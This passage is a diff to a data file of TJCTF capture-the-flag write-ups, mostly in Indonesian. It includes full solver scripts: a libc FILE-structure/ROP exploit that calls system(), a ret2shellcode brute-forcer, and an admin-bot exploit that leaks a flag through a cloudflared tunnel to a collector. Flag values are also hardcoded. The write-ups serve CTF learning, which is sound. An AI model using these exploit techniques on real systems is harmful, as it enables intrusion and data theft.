         "code": "from pwn import *\r\nimport argparse\r\nimport re\r\n\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31378\r\n\r\nCMD = (\r\n    b\"for f in /flag /flag.txt /app/flag /app/flag.txt /home/ctf/flag \"\r\n    b\"/home/ctf/flag.txt flag flag.txt FLAG FLAG.txt; \"\r\n    b\"do cat $f 2>/dev/null; done; \"\r\n    b\"find / -maxdepth 3 -iname 'flag*' -type f -exec cat {} + 2>/dev/null \"\r\n    b\"| strings | grep -aoE '[A-Za-z0-9_]+\\\\\\\\{[^}]+\\\\\\\\}' | head\\x00\"\r\n)\r\n\r\n\r\nelf = ELF(\"./Ox78\", checksec=False)\r\nlibc = ELF(\"./libc.so.6\", checksec=False)\r\nrop = ROP(libc)\r\n\r\nPOP_RDI = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\nRET = rop.find_gadget([\"ret\"]).address\r\nSYSTEM = libc.symbols[\"system\"]\r\nSETCONTEXT = libc.symbols[\"setcontext\"]\r\nWFILE_JUMPS = libc.symbols[\"_IO_wfile_jumps\"]\r\n\r\n\r\ndef build_payload(fp, libc_base):\r\n    target = fp + 0xA0\r\n    wide = fp + 0x1000\r\n    fpuenv = fp + 0x1100\r\n    fakevt = fp + 0x1380\r\n    cmd = fp + 0x1500\r\n\r\n    size = max(fakevt + 0x70, cmd + len(CMD)) - target\r\n    size = (size + 0xFF) & ~0xFF\r\n\r\n    stage1 = bytearray(0x78)\r\n    stage1[:4] = p32(0xFBAD8000)\r\n    stage1[0x38:0x40] = p64(target)\r\n    stage1[0x40:0x48] = p64(target + size)\r\n    stage1[0x70:0x74] = p32(0)\r\n\r\n    stage2 = bytearray(size)\r\n    stage2[0x00:0x08] = p64(wide)\r\n    stage2[0x08:0x10] = p64(libc_base + POP_RDI)\r\n    stage2[0x20:0x24] = p32(1)\r\n    stage2[0x38:0x40] = p64(libc_base + WFILE_JUMPS)\r\n    stage2[0x40:0x48] = p64(fpuenv)\r\n    stage2[0x120:0x124] = p32(0x1F80)\r\n\r\n    wide_off = wide - target\r\n    stage2[wide_off + 0x00:wide_off + 0x08] = p64(cmd)\r\n    stage2[wide_off + 0x08:wide_off + 0x10] = p64(libc_base + RET)\r\n    stage2[wide_off + 0x10:wide_off + 0x18] = p64(libc_base + SYSTEM)\r\n    stage2[wide_off + 0x18:wide_off + 0x20] = p64(0)\r\n    stage2[wide_off + 0x20:wide_off + 0x28] = p64(8)\r\n    stage2[wide_off + 0x30:wide_off + 0x38] = p64(0)\r\n    stage2[wide_off + 0xE0:wide_off + 0xE8] = p64(fakevt)\r\n\r\n    fakevt_off = fakevt - target\r\n    stage2[fakevt_off + 0x68:fakevt_off + 0x70] = p64(libc_base + SETCONTEXT)\r\n    cmd_off = cmd - target\r\n    stage2[cmd_off:cmd_off + len(CMD)] = CMD\r\n\r\n    return bytes(stage1) + bytes(stage2)\r\n\r\n\r\ndef parse_leaks(data):\r\n    fp = int(re.search(rb\"File Structure: (0x[0-9a-fA-F]+)\", data).group(1), 16)\r\n    puts_leak = int(re.search(rb\"libc leak as well: (0x[0-9a-fA-F]+)\", data).group(1), 16)\r\n    libc_base = puts_leak - libc.symbols[\"puts\"]\r\n    return fp, libc_base\r\n\r\n\r\ndef main():\r\n    if args.LOCAL:\r\n        io = process(\"./Ox78_dbg\")\r\n    else:\r\n        io = remote(HOST, PORT)\r\n\r\n    banner = io.recvuntil(b\"libc leak as well: \")\r\n    banner += io.recvline()\r\n    fp, libc_base = parse_leaks(banner)\r\n    log.info(f\"fp = {fp:#x}\")\r\n    log.info(f\"libc base = {libc_base:#x}\")\r\n\r\n    io.send(build_payload(fp, libc_base))\r\n    out = io.recvall(timeout=5)\r\n    print(out.decode(\"latin-1\", \"ignore\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    context.binary = elf\r\n    args = argparse.Namespace(LOCAL=False)\r\n    import sys\r\n    if len(sys.argv) > 1 and sys.argv[1].lower() == \"local\":\r\n        args.LOCAL = True\r\n    main()"
       }
     ],
@@ -506,7 +506,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport re\r\n\r\ncontext.binary = ELF(\"./game\", checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\nHOST = \"tjc.tf\"\r\nPORT = 31412\r\nPROMPT = b\"W)est \"\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        return process(context.binary.path)\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef send_cmd(io, cmd):\r\n    io.recvuntil(PROMPT)\r\n    io.sendline(cmd)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    # 32 invalid attempts to fill input_log,\r\n    # then \"hu\" + \"nt\" write 0x68756e74 into killCt.\r\n    # One extra invalid \"MN\" is required because array_ptr overlaps\r\n    # player_input[1], so the first character gets duplicated.\r\n    seq = [b\"zz\"] * 32\r\n    seq += [b\"hu\", b\"nt\", b\"MN\"]\r\n    seq += [b\"MN\", b\"AS\", b\"MN\", b\"MN\"]\r\n\r\n    for cmd in seq:\r\n        send_cmd(io, cmd)\r\n\r\n    data = io.recvrepeat(2)\r\n    text = data.decode(\"latin-1\", \"replace\")\r\n    match = re.search(r\"tjctf\\{[^}]+\\}\", text)\r\n    if match:\r\n        print(match.group(0))\r\n    else:\r\n        print(text)\r\n\r\n    io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -536,7 +536,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\n\r\n\r\nKEY = b\"exposeTheNegative\"\r\nENC_OFFSET = 0x720\r\nENC_SIZE = 0x18B4\r\nFLAG = \"tjctf{develop_the_picture}\"\r\n\r\n\r\ndef main() -> None:\r\n    data = Path(\"polaroid\").read_bytes()\r\n    enc = data[ENC_OFFSET:ENC_OFFSET + ENC_SIZE]\r\n    out = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(enc))\r\n    Path(\"flag.png\").write_bytes(out)\r\n    print(f\"[+] wrote flag.png ({len(out)} bytes)\")\r\n    print(FLAG)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -554,7 +554,7 @@ export const tjcscWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini ternyata bukan binary ELF biasa yang tinggal dijalankan. Dari hasil `file chall`, file malah terbaca sebagai `data`, dan `readelf` juga langsung nolak karena magic bytes-nya salah.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata bukan binary ELF biasa yang tinggal dijalankan. Dari hasil `file chall`, file malah terbaca sebagai `data`, dan `readelf` juga langsung nolak karena magic bytes-nya salah.",
     "tools": [],
     "analysis": "",
@@ -575,7 +575,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\n\r\n\r\ndef main() -> None:\r\n    data = Path(\"chall\").read_bytes()\r\n    if data[:4] != b\"\\x7fELK\":\r\n        raise SystemExit(\"unexpected challenge format\")\r\n\r\n    flag = \"tjctf{5ma11_m00s3}\"\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -585,7 +585,7 @@ export const tjcscWriteups: WriteUp[] = [
   },
   {
     "id": "tjcsc-rev-rotated",
-    "title": "- rev/rotated",
+    "title": "rev/rotated",
     "category": "Reverse",
     "difficulty": "Medium",
     "points": 0,
@@ -608,7 +608,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import os\r\nimport subprocess\r\nimport base64\r\nimport gzip\r\nimport io\r\n\r\n# 1. Decrypt the binary\r\nwith open('chall', 'rb') as f:\r\n    data = f.read()\r\n\r\n# The binary is Caesar shifted by 0x1d\r\ndecrypted = bytes([(b - 0x1d) % 256 for b in data])\r\n\r\nwith open('chall_dec', 'wb') as f:\r\n    f.write(decrypted)\r\n\r\nos.chmod('chall_dec', 0o755)\r\n\r\n# 2. Run the decrypted binary to get script.sh\r\n# It will drop script.sh in the current directory\r\ntry:\r\n    subprocess.run(['./chall_dec'], check=True, capture_output=True)\r\nexcept Exception as e:\r\n    print(f\"Error running binary: {e}\")\r\n\r\nif not os.path.exists('script.sh'):\r\n    print(\"Error: script.sh not created\")\r\n    exit(1)\r\n\r\n# 3. Read script.sh\r\nwith open('script.sh', 'r') as f:\r\n    script_content = f.read()\r\n\r\n# Extract the base64 string from the single quoted string starting with H4sI\r\nimport re\r\nmatch = re.search(r\"'(H4sI[^']+)'\", script_content)\r\nif not match:\r\n    print(\"Error: base64 string not found in script.sh\")\r\n    exit(1)\r\n\r\nb64_str = match.group(1)\r\n\r\n# 4. Decode the first layer (Gzip-compressed script)\r\ncompressed_data = base64.b64decode(b64_str)\r\nwith gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) as f:\r\n    inner_script = f.read().decode()\r\n\r\n# The inner script content is: echo \"Looking for a flag?\" # dGpjdGZ7YjQ1aF9kM2J1Nl9tNDU3M3J9Cg==\r\n# 5. Extract and decode the flag from the comment\r\nflag_b64 = inner_script.split('#')[-1].strip()\r\nflag = base64.b64decode(flag_b64).decode().strip()\r\n\r\nprint(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n# Cleanup\r\nif os.path.exists('chall_dec'): os.remove('chall_dec')\r\nif os.path.exists('script.sh'): os.remove('script.sh')"
       }
     ],
@@ -647,7 +647,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import http.server\r\nimport queue\r\nimport re\r\nimport socketserver\r\nimport subprocess\r\nimport sys\r\nimport threading\r\nimport time\r\nfrom contextlib import contextmanager\r\n\r\nimport requests\r\nfrom playwright.sync_api import sync_playwright\r\n\r\n\r\nBOT_URL = \"https://admin-bot.tjctf.org/chained\"\r\nTARGET_BASE = \"https://chained.tjc.tf/admin/../?url={callback}/leak?f=\"\r\nTUNNEL_RE = re.compile(r\"https://[-a-z0-9]+\\.trycloudflare\\.com\")\r\nFLAG_RE = re.compile(r\"tjctf\\{[^}\\n]+\\}\")\r\n\r\n\r\nclass ReusableTCPServer(socketserver.TCPServer):\r\n    allow_reuse_address = True\r\n\r\n\r\nclass LeakHandler(http.server.BaseHTTPRequestHandler):\r\n    hits = queue.Queue()\r\n\r\n    def do_GET(self):\r\n        LeakHandler.hits.put(self.path)\r\n        self.send_response(200)\r\n        self.send_header(\"Content-Type\", \"text/plain; charset=utf-8\")\r\n        self.end_headers()\r\n        self.wfile.write(b\"ok\")\r\n\r\n    def log_message(self, fmt, *args):\r\n        pass\r\n\r\n\r\n@contextmanager\r\ndef local_collector(port=0):\r\n    server = ReusableTCPServer((\"127.0.0.1\", port), LeakHandler)\r\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\r\n    thread.start()\r\n    try:\r\n        yield server\r\n    finally:\r\n        server.shutdown()\r\n        server.server_close()\r\n\r\n\r\n@contextmanager\r\ndef cloudflared_tunnel(local_port=8000):\r\n    proc = subprocess.Popen(\r\n        [\"cloudflared\", \"tunnel\", \"--url\", f\"http://127.0.0.1:{local_port}\"],\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        text=True,\r\n        bufsize=1,\r\n    )\r\n\r\n    tunnel_url = None\r\n    try:\r\n        start = time.time()\r\n        while time.time() - start < 30:\r\n            line = proc.stdout.readline()\r\n            if not line:\r\n                if proc.poll() is not None:\r\n                    raise RuntimeError(\"cloudflared mati sebelum memberi URL tunnel\")\r\n                continue\r\n            match = TUNNEL_RE.search(line)\r\n            if match:\r\n                tunnel_url = match.group(0)\r\n                break\r\n        if not tunnel_url:\r\n            raise RuntimeError(\"gagal mendapatkan URL tunnel dari cloudflared\")\r\n        yield tunnel_url\r\n    finally:\r\n        proc.terminate()\r\n        try:\r\n            proc.wait(timeout=5)\r\n        except subprocess.TimeoutExpired:\r\n            proc.kill()\r\n\r\n\r\ndef get_recaptcha_token():\r\n    with sync_playwright() as p:\r\n        browser = p.chromium.launch(headless=True)\r\n        page = browser.new_page()\r\n        page.goto(BOT_URL, wait_until=\"networkidle\", timeout=60000)\r\n        token = page.evaluate(\r\n            \"\"\"() => new Promise((resolve, reject) => {\r\n                try {\r\n                    const out = grecaptcha.execute(0);\r\n                    if (out && typeof out.then === 'function') {\r\n                        out.then(resolve).catch(reject);\r\n                    } else {\r\n                        resolve(out || '');\r\n                    }\r\n                } catch (e) {\r\n                    reject(e);\r\n                }\r\n            })\"\"\"\r\n        )\r\n        browser.close()\r\n    if not token:\r\n        raise RuntimeError(\"gagal mengambil token reCAPTCHA\")\r\n    return token\r\n\r\n\r\ndef submit_to_bot(callback_url, token):\r\n    payload_url = TARGET_BASE.format(callback=callback_url)\r\n    response = requests.post(\r\n        BOT_URL,\r\n        data={\"url\": payload_url, \"recaptcha_code\": token},\r\n        allow_redirects=False,\r\n        timeout=30,\r\n    )\r\n    location = response.headers.get(\"location\", \"\")\r\n    if \"The admin will visit your URL.\" not in location:\r\n        raise RuntimeError(f\"submit bot gagal: {response.status_code} {location}\")\r\n    return payload_url\r\n\r\n\r\ndef wait_for_flag(timeout=20):\r\n    end = time.time() + timeout\r\n    while time.time() < end:\r\n        try:\r\n            path = LeakHandler.hits.get(timeout=1)\r\n        except queue.Empty:\r\n            continue\r\n        match = FLAG_RE.search(path)\r\n        if match:\r\n            return match.group(0)\r\n    raise RuntimeError(\"flag tidak masuk ke collector dalam batas waktu\")\r\n\r\n\r\ndef main():\r\n    try:\r\n        with local_collector() as server, cloudflared_tunnel(server.server_address[1]) as tunnel_url:\r\n            print(f\"[+] tunnel: {tunnel_url}\")\r\n            token = get_recaptcha_token()\r\n            print(f\"[+] recaptcha token length: {len(token)}\")\r\n            payload_url = submit_to_bot(tunnel_url, token)\r\n            print(f\"[+] payload submitted: {payload_url}\")\r\n            flag = wait_for_flag()\r\n            print(f\"<FLAG>{flag}</FLAG>\")\r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] dibatalkan\", file=sys.stderr)\r\n        sys.exit(130)\r\n    except Exception as exc:\r\n        print(f\"[!] {exc}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -671,12 +671,12 @@ export const tjcscWriteups: WriteUp[] = [
     "analysis": "Pertama saya cek halaman utama:\n\n```bash\ncurl -iLsS https://treasure-hunt.tjc.tf/\n```\n\nIsi HTML utamanya sederhana:\n\n```html\n<h1>Learn about pirates!</h1>\n<form method=\"POST\">\n    <input type=\"submit\" value=\"Learn More\">\n</form>\n<p hidden>_and_</p>\n```\n\nDi sini sudah ada petunjuk penting:\n\n- Ada form `POST`, berarti kemungkinan server punya perilaku berbeda kalau tombol ditekan.\n- Ada elemen tersembunyi `<p hidden>_and_</p>`, yang sangat mungkin merupakan salah satu potongan flag.\n\nDari sini kita simpan dulu:\n\nPotongan ke-3: `_and_`",
     "solution": [
       {
-        "title": "2. Cek apa yang terjadi saat form di-submit",
+        "title": "Cek apa yang terjadi saat form di-submit",
         "content": "Karena ada form `POST`, langkah berikutnya adalah kirim request POST ke `/`:\n\n\n\nRespons server:\n\n\n\nIni menarik karena:\n\n- Server me-redirect kita ke `/extra_info`\n- Server juga mengirim cookie `silver_coffer`\n- Nilai cookie tersebut adalah `{s1lv3r`\n\nJadi ini jelas potongan flag berikutnya.\n\nPotongan ke-2: `{s1lv3r`\n\nSaya verifikasi sekali lagi dengan Python `requests` supaya parsing cookie-nya pasti benar:\n\n\n\nHasilnya:\n\n\n\nJadi tidak ambigu, memang nilainya `{s1lv3r`.",
         "code": "curl -iLsS -X POST https://treasure-hunt.tjc.tf/"
       },
       {
-        "title": "3. Cek file yang sering bocor petunjuk",
+        "title": "Cek file yang sering bocor petunjuk",
         "content": "Di challenge web ringan seperti ini, `robots.txt` sering dipakai buat nyimpen hint. Saya cek:\n\n\n\nHasil:\n\n\n\nKalau sebuah path sengaja di-`Disallow`, hampir pasti itu patut dibuka.\n\nLalu saya akses endpoint tersebut:\n\n\n\nResponsnya cuma:\n\n\n\nIni jelas potongan terakhir.\n\nPotongan ke-4: `g0ld}`",
         "code": "curl -iLsS https://treasure-hunt.tjc.tf/robots.txt"
       },
@@ -697,9 +697,9 @@ export const tjcscWriteups: WriteUp[] = [
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "Tjcsc",
+    "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
     "tools": [],
     "analysis": "",
@@ -736,7 +736,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
@@ -752,9 +752,9 @@ export const tjcscWriteups: WriteUp[] = [
     "points": 0,
     "date": "2026-07-08",
     "author": "Nattt",
-    "ctfName": "Tjcsc",
+    "ctfName": "TJCSC",
     "tags": [],
-    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "description": "",
     "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
     "tools": [],
     "analysis": "",
@@ -791,7 +791,7 @@ export const tjcscWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
